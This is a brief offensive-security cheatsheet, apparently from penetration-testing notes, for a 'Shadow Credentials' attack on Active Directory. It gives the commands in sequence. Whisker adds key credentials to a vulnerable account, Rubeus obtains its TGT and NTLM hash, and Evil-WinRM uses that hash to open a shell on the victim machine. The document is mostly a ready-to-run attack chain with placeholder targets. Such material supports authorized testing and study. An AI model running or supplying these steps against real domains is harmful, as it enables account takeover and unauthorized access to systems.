## AA


### Whisker
https://github.com/eladshamir/Whisker
Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their `msDS-KeyCredentialLink` attribute, effectively adding "**Shadow Credentials**" to the target account.

To identify vulnerable users read `Find-InterestingDomainAcl` from AD Recon cheatsheet.

```
.\Whisker.exe add /target:<CN of vulnerable user>
```
### Rubeus
Automatically obtain the TGT and NTLM hash of the user
```
# Execute the command prepared by Whisker
.\Rubeus.exe asktgt /user:[...]
```
Copy the NTLM hash from the last line
### Evil-WinRM
From the Kali machine exceute evilWinRM to connect to the victim machine
```
evil-winrm -i <IP> -u <vulnerable user> -H <NTLM hash>
```
If connected, you have a great shell with the rights of the victim
